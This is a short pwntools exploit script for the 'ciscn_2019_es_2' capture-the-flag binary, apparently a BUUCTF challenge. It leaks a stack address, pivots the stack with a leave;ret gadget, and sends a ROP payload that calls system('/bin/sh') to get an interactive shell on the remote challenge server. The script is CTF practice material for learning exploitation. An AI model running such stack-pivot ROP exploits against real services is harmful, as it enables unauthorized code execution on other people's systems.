from pwn import *

# io = process('./ciscn_2019_es_2')
io = remote('node4.buuoj.cn', 25169)
padding = cyclic(0x27)
io.recvuntil(b"Welcome, my friend. What's your name?\n")
io.sendline(padding)
io.recvline()
ebp = u32(io.recv(4))  # raw ebp
log.info('ebp_addr => %#x', ebp)
# gdb.attach(io)
leave_ret = 0x80485fd  # leave; ret; 这俩个都行
leave_ret = 0x80484b8  # ROPgadget --binary ./ciscn_2019_es_2 --only "leave|ret"
elf = ELF('./ciscn_2019_es_2')
system_addr = elf.symbols['system']  # 0x8048400
shell_addr = elf.symbols['hack']
stdin_addr = ebp-0x38
payload = p32(ebp)
payload += p32(system_addr) + p32(0) + p32(stdin_addr+0x10) + b'/bin/sh\x00'
payload += cyclic(0x10) + p32(stdin_addr) + p32(leave_ret)
io.sendline(payload)
io.interactive()